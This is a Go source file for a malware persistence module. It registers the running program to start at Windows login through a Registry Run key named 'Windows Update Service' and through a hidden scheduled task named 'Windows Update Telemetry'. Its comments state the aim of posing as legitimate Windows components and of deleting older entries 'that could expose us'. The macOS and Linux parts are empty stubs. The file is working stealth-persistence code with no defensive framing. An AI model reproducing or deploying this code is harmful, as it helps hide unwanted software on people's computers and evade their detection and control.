package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

// Stealth identity constants — these should look like legitimate Windows components.
const (
	registryValueName = "Windows Update Service"
	taskName          = "Windows Update Telemetry"
)

// Legacy key names to clean up from previous versions.
var legacyKeyNames = []string{
	"Shadow Log",
	"OneDrive Helper",
	"OneDriveUpdate",
	"onedrive hgelper",
}

// Install sets the currently running application to automatically start with the system.
func Install() error {
	execPath, err := os.Executable()
	if err != nil {
		return err
	}

	switch runtime.GOOS {
	case "windows":
		err = installWindows(execPath)
		installSchTasks(execPath)
		return err
	case "darwin":
		return installMacOS(execPath)
	case "linux":
		return installLinux(execPath)
	}
	return fmt.Errorf("platform not supported")
}

// IsInstalled checks if the application is configured to start automatically.
func IsInstalled() bool {
	switch runtime.GOOS {
	case "windows":
		return checkWindows()
	}
	return false
}

// installWindows adds the executable to the Windows registry Run key.
func installWindows(execPath string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()

	// Clean up ALL legacy keys that could expose us.
	for _, name := range legacyKeyNames {
		k.DeleteValue(name)
	}

	// Set the new stealth key.
	return k.SetStringValue(registryValueName, execPath)
}

// checkWindows verifies if the registry entry exists.
func checkWindows() bool {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()

	_, _, err = k.GetStringValue(registryValueName)
	return err == nil
}

// installSchTasks creates a secondary persistence entry using Windows Task Scheduler.
func installSchTasks(execPath string) {
	// Use a name that blends with real Windows telemetry tasks.
	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", execPath, "/sc", "onlogon", "/f", "/rl", "LIMITED")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	// Clean up legacy task name if it exists.
	cleanCmd := exec.Command("schtasks", "/delete", "/tn", "Shadow Log Reporting", "/f")
	cleanCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cleanCmd.Run()
}

func installMacOS(_ string) error {
	// TODO: Implement macOS LaunchAgent installation.
	return nil
}

// installLinux would create a .desktop file in autostart.
// Currently unimplemented.
func installLinux(_ string) error {
	// TODO: Implement Linux autostart installation.
	return nil
}
